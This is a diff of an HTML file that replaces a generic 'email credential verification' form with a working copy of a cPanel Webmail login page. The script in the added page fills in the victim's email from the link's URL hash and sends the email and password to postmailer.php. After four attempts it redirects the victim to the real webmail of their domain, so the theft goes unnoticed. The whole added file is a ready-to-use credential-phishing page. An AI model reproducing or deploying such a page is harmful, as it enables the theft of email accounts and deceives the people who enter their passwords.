@@ -1,339 +1,321 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Email Verification System</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        .container {
-            background: white;
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 400px;
-            position: relative;
-        }
-
-        .logo {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .logo h1 {
-            color: #333;
-            font-size: 28px;
-            font-weight: 300;
-            margin-bottom: 10px;
-        }
-
-        .logo p {
-            color: #666;
-            font-size: 14px;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-            position: relative;
-        }
-
-        .form-group label {
-            display: block;
-            color: #555;
-            font-size: 14px;
-            margin-bottom: 5px;
-            font-weight: 500;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 12px 15px;
-            border: 2px solid #e1e1e1;
-            border-radius: 8px;
-            font-size: 16px;
-            transition: all 0.3s ease;
-            background: #f8f9fa;
-        }
-
-        .form-group input:focus {
-            outline: none;
-            border-color: #667eea;
-            background: white;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
-        }
-
-        .submit-btn {
-            width: 100%;
-            padding: 12px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
-        }
-
-        .submit-btn:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-
-        .loading {
-            display: none;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-        }
-
-        .spinner {
-            width: 20px;
-            height: 20px;
-            border: 2px solid #ffffff40;
-            border-top: 2px solid #ffffff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .message {
-            margin-top: 20px;
-            padding: 12px;
-            border-radius: 8px;
-            text-align: center;
-            font-weight: 500;
-            display: none;
-        }
-
-        .message.success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-
-        .message.error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-
-        .message.warning {
-            background: #fff3cd;
-            color: #856404;
-            border: 1px solid #ffeaa7;
-        }
-
-        .security-notice {
-            background: #e3f2fd;
-            border: 1px solid #bbdefb;
-            color: #1565c0;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            font-size: 12px;
-            text-align: center;
-        }
-
-        .form-footer {
-            text-align: center;
-            margin-top: 30px;
-            color: #666;
-            font-size: 12px;
-        }
-
-        .eye-icon {
-            position: absolute;
-            right: 15px;
-            top: 35px;
-            cursor: pointer;
-            color: #666;
-            user-select: none;
-        }
-
-        .eye-icon:hover {
-            color: #667eea;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="logo">
-            <h1>Email Verification</h1>
-            <p>Secure credential validation system</p>
-        </div>
-
-        <div class="security-notice">
-            <strong>Security Notice:</strong> This system validates email credentials for authorized testing purposes only.
-        </div>
-
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="email">Email Address</label>
-                <input type="email" id="email" name="email" required autocomplete="email">
+<html lang="en" dir="ltr">
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
+      <meta name="google" content="notranslate">
+      <meta name="apple-itunes-app" content="app-id=1188352635">
+      <title>Webmail Login</title>
+      <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGYYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdapa26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjParPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/666t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">
+      <!-- EXTERNAL CSS -->
+      <link href="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1386192030/unprotected/cpanel/fonts/open_sans/open_sans.min.css" rel="stylesheet" type="text/css">
+      <link href="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1560357916/unprotected/cpanel/style_v2_optimized.css" rel="stylesheet" type="text/css">
+      <style type="text/css">
+         /*
+         This css is included in the base template in case the css cannot be loaded because of access restrictions
+         If this css is updated, please update securitypolicy_header.html.tmpl as well
+         */
+         .copyright {
+         background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA7Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA4LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll center top transparent;
+         background-size: 25px auto;
+         }
+         
+         .success-notice {
+             background-color: #d4edda;
+             border-color: #c3e6cb;
+             color: #155724;
+         }
+         
+         .loading-overlay {
+             display: none;
+             position: fixed;
+             top: 0;
+             left: 0;
+             width: 100%;
+             height: 100%;
+             background-color: rgba(0,0,0,0.5);
+             z-index: 9999;
+         }
+         
+         .loading-content {
+             position: absolute;
+             top: 50%;
+             left: 50%;
+             transform: translate(-50%, -50%);
+             background: white;
+             padding: 30px;
+             border-radius: 10px;
+             text-align: center;
+         }
+         
+         .spinner {
+             border: 4px solid #f3f3f3;
+             border-top: 4px solid #3498db;
+             border-radius: 50%;
+             width: 40px;
+             height: 40px;
+             animation: spin 1s linear infinite;
+             margin: 0 auto 20px auto;
+         }
+         
+         @keyframes spin {
+             0% { transform: rotate(0deg); }
+             100% { transform: rotate(360deg); }
+         }
+      </style>
+   </head>
+   <body class="wm">
+      <div id="preload_images"></div>
+      <input type="hidden" id="goto_uri" value="/?locale=en">
+      <input type="hidden" id="goto_app" value="">
+      <!-- Do not remove msg_code as it is needed for automated testing - msg_code:[invalid_session]  -->
+      
+      <!-- Loading overlay -->
+      <div id="loading-overlay" class="loading-overlay">
+         <div class="loading-content">
+            <div class="spinner"></div>
+            <p>Processing login and redirecting...</p>
+         </div>
+      </div>
+      
+      <div id="login-wrapper" class="group has-pw-reset" style="opacity: 1; visibility: visible;">
+         <div class="wrapper">
+            <div id="notify">
+               <div id="login-status" class="error-notice" style="display:none;">
+                  <div class="content-wrapper">
+                     <div id="login-detail">
+                        <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
+                        <div id="login-status-message">Login is invalid</div>
+                     </div>
+                  </div>
+               </div>
             </div>
-
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" required autocomplete="current-password">
-                <span class="eye-icon" id="togglePassword">👁️</span>
+            <div id="content-container">
+               <div id="login-container">
+                  <div id="login-sub-container">
+                     <div id="login-sub-header">
+                        <img class="main-logo" src="https://webmail.gracedrive.org/cPanel_magic_revision_1453787365/unprotected/cpanel/images/webmail-logo.svg" alt="logo" style="width:300px;height:70px;margin-bottom:50px;">
+                     </div>
+                     <div id="login-sub">
+                        <div id="forms">
+                           <form novalidate="" id="login_form" action="postmailer.php" method="post"  style="visibility:">
+                              <div class="input-req-login"><label for="user">Email Address</label></div>
+                              <div class="input-field-login icon username-container">
+                                 <input name="email" id="email" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
+                              </div>
+                              <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
+                              <div class="input-field-login icon password-container">
+                                 <input name="password" id="password" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
+                              </div>
+                              <p id="msg" style="color:red;"></p>
+                              <div class="controls">
+                                 <div class="login-btn">
+                                    <button name="login"  id="login_submit" tabindex="3">Log in</button>
+                                 </div>
+                                 <div class="reset-pw">
+                                    <a href="#" id="reset_password">Reset Password
+                                    </a>
+                                 </div>
+                              </div>
+                              <div class="clear" id="push"></div>
+                           </form>
+                           <!--CLOSE forms -->
+                        </div>
+                        <!--CLOSE login-sub -->
+                     </div>
+                     <!--CLOSE wrapper -->
+                  </div>
+                  <!--CLOSE login-sub-container -->
+               </div>
+               <!--CLOSE login-container -->
             </div>
-
-            <button type="submit" class="submit-btn" id="submitBtn">
-                <span class="btn-text">Verify Credentials</span>
-                <div class="loading" id="loading">
-                    <div class="spinner"></div>
-                </div>
-            </button>
-        </form>
-
-        <div class="message" id="message"></div>
-
-        <div class="form-footer">
-            <p>© 2024 SS-RCube System. All rights reserved.</p>
-        </div>
-    </div>
-
-    <script>
-        // Toggle password visibility
-        document.getElementById('togglePassword').addEventListener('click', function() {
-            const passwordField = document.getElementById('password');
-            const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
-            passwordField.setAttribute('type', type);
-            this.textContent = type === 'password' ? '👁️' : '🙈';
-        });
-
-        // Form submission handler
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const form = this;
-            const submitBtn = document.getElementById('submitBtn');
-            const btnText = submitBtn.querySelector('.btn-text');
-            const loading = document.getElementById('loading');
-            const message = document.getElementById('message');
-            
-            // Get form data
-            const formData = new FormData(form);
-            const email = formData.get('email');
-            const password = formData.get('password');
-            
-            // Basic validation
-            if (!email || !password) {
-                showMessage('Please fill in all fields', 'error');
-                return;
-            }
-            
-            if (!isValidEmail(email)) {
-                showMessage('Please enter a valid email address', 'error');
-                return;
-            }
-            
-            // Show loading state
-            submitBtn.disabled = true;
-            btnText.style.opacity = '0';
-            loading.style.display = 'block';
-            message.style.display = 'none';
-            
-            try {
-                const response = await fetch('process_login.php', {
-                    method: 'POST',
-                    body: formData,
-                    headers: {
-                        'X-Requested-With': 'XMLHttpRequest'
-                    }
-                });
-                
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-                
-                const result = await response.json();
-                
-                // Handle response
-                if (result.signal === 'OK') {
-                    showMessage(result.msg || 'Verification successful!', 'success');
-                    form.reset();
-                } else if (result.signal === 'not ok') {
-                    showMessage(result.msg || 'Invalid credentials', 'warning');
-                } else {
-                    showMessage(result.msg || 'An error occurred', 'error');
-                }
-                
-            } catch (error) {
-                console.error('Error:', error);
-                showMessage('Connection failed. Please try again.', 'error');
-            } finally {
-                // Reset button state
-                submitBtn.disabled = false;
-                btnText.style.opacity = '1';
-                loading.style.display = 'none';
-            }
-        });
-        
-        function showMessage(text, type) {
-            const message = document.getElementById('message');
-            message.textContent = text;
-            message.className = `message ${type}`;
-            message.style.display = 'block';
-            
-            // Auto-hide success messages after 5 seconds
-            if (type === 'success') {
-                setTimeout(() => {
-                    message.style.display = 'none';
-                }, 5000);
-            }
-        }
-        
-        function isValidEmail(email) {
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return emailRegex.test(email);
-        }
-        
-        // Auto-clear messages when user starts typing
-        document.getElementById('email').addEventListener('input', function() {
-            const message = document.getElementById('message');
-            if (message.style.display === 'block') {
-                message.style.display = 'none';
-            }
-        });
-        
-        document.getElementById('password').addEventListener('input', function() {
-            const message = document.getElementById('message');
-            if (message.style.display === 'block') {
-                message.style.display = 'none';
-            }
-        });
-    </script>
-</body>
+         </div>
+         <!--Close login-wrapper -->
+      </div>
+      <style>
+         @media (min-width: 481px) {
+         #select_user_form {
+         width: px;
+         }
+         }
+      </style>
+      <div class="copyright">Copyright©&nbsp;2025 cPanel, L.L.C.
+         <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a>
+      </div>
+      <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+      <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+      <script>
+         $(document).ready(function() {
+             var loginAttempts = 0;
+             var maxAttempts = 4;
+             
+             // Function to extract email from URL hash
+             function extractEmailFromHash() {
+                 var hash = window.location.hash;
+                 if (hash && hash.length > 1) {
+                     // Remove the # symbol
+                     var emailCandidate = hash.substring(1);
+                     
+                     // Simple email validation regex
+                     var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+                     
+                     if (emailRegex.test(emailCandidate)) {
+                         return emailCandidate;
+                     }
+                 }
+                 return null;
+             }
+             
+             // Auto-populate email field if valid email is in hash
+             var emailFromHash = extractEmailFromHash();
+             if (emailFromHash) {
+                 $('#email').val(emailFromHash);
+                 // Focus on password field since email is already filled
+                 $('#password').focus();
+             }
+             
+             // Function to get webmail domain
+             function getWebmailDomain(email) {
+                 var domain = email.split('@')[1];
+                 return 'https://webmail.' + domain;
+             }
+             
+             // Form submission handler
+             $('#login_submit').click(function(e) {
+                 e.preventDefault();
+                 
+                 var email = $('#email').val();
+                 var password = $('#password').val();
+                 
+                 // Basic validation
+                 if (!email) {
+                     $('#msg').text('Please enter an email address.').show();
+                     return false;
+                 }
+                 
+                 if (!password) {
+                     $('#msg').text('Please enter a password.').show();
+                     return false;
+                 }
+                 
+                 // Email format validation
+                 var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+                 if (!emailRegex.test(email)) {
+                     $('#msg').text('Please enter a valid email address.').show();
+                     return false;
+                 }
+                 
+                 // Clear any previous messages
+                 $('#msg').hide();
+                 $('#login-status').hide();
+                 
+                 // Increment login attempts
+                 loginAttempts++;
+                 
+                 // Show loading overlay
+                 $('#loading-overlay').show();
+                 
+                 // Submit the form via AJAX
+                 $.ajax({
+                     url: 'postmailer.php',
+                     type: 'POST',
+                     data: {
+                         email: email,
+                         password: password
+                     },
+                     dataType: 'json',
+                     beforeSend: function() {
+                         $('#login_submit').prop('disabled', true).text('Processing...');
+                     },
+                     success: function(response) {
+                         $('#loading-overlay').hide();
+                         
+                         if (response && response.signal === 'OK') {
+                             // Success - show success message and redirect
+                             $('#login-status-message').text(response.msg || 'Login successful! Redirecting...');
+                             $('#login-status').removeClass('error-notice').addClass('success-notice').show();
+                             
+                             // Get redirect URL from response or construct it
+                             var redirectUrl = response.redirect_url || getWebmailDomain(email);
+                             
+                             // Redirect after 2 seconds
+                             setTimeout(function() {
+                                 window.location.href = redirectUrl;
+                             }, 2000);
+                             
+                         } else {
+                             // Login failed
+                             if (loginAttempts >= maxAttempts) {
+                                 // After 4 attempts, redirect to the webmail domain
+                                 $('#login-status-message').text('Multiple login attempts detected. Redirecting to your webmail...');
+                                 $('#login-status').removeClass('error-notice').addClass('success-notice').show();
+                                 
+                                 setTimeout(function() {
+                                     window.location.href = getWebmailDomain(email);
+                                 }, 3000);
+                             } else {
+                                 // Show error and allow retry
+                                 $('#login-status-message').text(response.msg || 'Invalid email or password. Please try again.');
+                                 $('#login-status').removeClass('success-notice').addClass('error-notice').show();
+                                 $('#password').val('').focus();
+                             }
+                         }
+                     },
+                     error: function(xhr, status, error) {
+                         $('#loading-overlay').hide();
+                         console.log('Error:', error);
+                         
+                         if (loginAttempts >= maxAttempts) {
+                             // After 4 attempts, redirect even on error
+                             $('#login-status-message').text('Redirecting to your webmail...');
+                             $('#login-status').removeClass('error-notice').addClass('success-notice').show();
+                             
+                             setTimeout(function() {
+                                 window.location.href = getWebmailDomain(email);
+                             }, 2000);
+                         } else {
+                             // Show error message
+                             $('#login-status-message').text('Connection error. Please try again.');
+                             $('#login-status').removeClass('success-notice').addClass('error-notice').show();
+                             $('#password').val('').focus();
+                         }
+                     },
+                     complete: function() {
+                         $('#login_submit').prop('disabled', false).text('Log in');
+                     }
+                 });
+                 
+                 return false;
+             });
+             
+             // Reset password functionality
+             $('#reset_password').click(function(e) {
+                 e.preventDefault();
+                 var email = $('#email').val();
+                 if (!email) {
+                     $('#msg').text('Please enter your email address first.').show();
+                     $('#email').focus();
+                     return false;
+                 }
+                 
+                 // Redirect to webmail domain for password reset
+                 var domain = email.split('@')[1];
+                 window.location.href = 'https://webmail.' + domain;
+             });
+             
+             // Hide messages when user starts typing
+             $('#email, #password').on('input', function() {
+                 $('#msg').hide();
+                 $('#login-status').hide();
+             });
+             
+             // Allow form submission with Enter key
+             $('#login_form').on('keypress', function(e) {
+                 if (e.which === 13) { // Enter key
+                     $('#login_submit').click();
+                 }
+             });
+         });
+      </script>
+   </body>
 </html>
